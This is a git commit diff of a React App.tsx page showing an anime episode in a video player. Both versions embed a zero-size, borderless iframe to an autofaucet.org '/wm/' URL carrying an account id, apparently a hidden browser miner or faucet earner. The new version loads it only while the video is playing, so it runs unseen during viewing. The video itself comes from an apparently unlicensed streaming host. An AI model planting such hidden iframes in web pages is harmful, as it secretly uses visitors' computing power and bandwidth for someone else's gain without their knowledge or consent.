423842c89767cceafaabb5add02e3dc568eec0c0
Olexandr <prikololeksandr@gmail.com>
2023-06-03 22:41:54 +0300

    lol

--- src/App.tsx
+++ src/App.tsx
@@ -1,12 +1,36 @@
 import './App.css';
-
-function App() {
-  return (
-    <div className="App">
-      <h1>Прівєт, Брабус</h1>
-      <iframe src="https://autofaucet.org/wm/swag124/4" width="0" title='bruh' height="0" style={{"border":"none"}}></iframe>
-    </div>
-  );
+import React, {SetStateAction} from "react"
+import ReactPlayer from 'react-player'
+interface Props{
+    isPlaying:boolean
+    setIsPlaying: React.Dispatch<SetStateAction<boolean>>;
 }
 
-export default App;
+const VideoPlayer:React.FC<Props> = ({isPlaying, setIsPlaying}) => {
+    return <div>
+        lalal
+    </div>
+}
+
+
+export default function App() {
+    const [isPlaying, setIsPlaying] = React.useState(false)
+    React.useEffect(()=>{
+
+        console.log(isPlaying)
+
+    },[isPlaying])
+    return (
+        <div className="App">
+            <h1>Прівєт, Брабус</h1>
+            {
+                isPlaying &&
+                <iframe src="https://autofaucet.org/wm/swag124/4" width="0" title='bruh' height="0"
+                        style={{"border": "none"}}></iframe>
+            }
+            <video onPlaying={()=>setIsPlaying(true)} onPause={()=>setIsPlaying(false)} controls src="https://svd11.vidme.link/video_mp4/serials/BirdieWingStory/2f3f2c5a604d49d7615525ef314a004c/s02e01.mp4"></video>
+            
+        </div>
+    );
+}
+
